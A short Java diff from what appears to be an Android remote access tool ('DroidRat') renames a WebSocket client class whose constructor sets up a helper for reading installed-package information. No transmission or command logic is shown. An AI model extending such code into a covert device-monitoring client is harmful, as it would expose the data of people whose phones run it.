@@ -11,12 +11,12 @@ import org.java_websocket.handshake.ServerHandshake;
 
 import java.net.URI;
 
-public class Websockets extends WebSocketClient {
+public class DroidRatWebSocketClient extends WebSocketClient {
 
     private final GetPackagesInfo getPackagesInfo;
     private final String TAG = "WebSocket";
 
-    public Websockets(URI serverUri, PackageManager packageManager, Context context) {
+    public DroidRatWebSocketClient(URI serverUri, PackageManager packageManager, Context context) {
         super(serverUri);
         getPackagesInfo = new GetPackagesInfo(packageManager, context);
     }
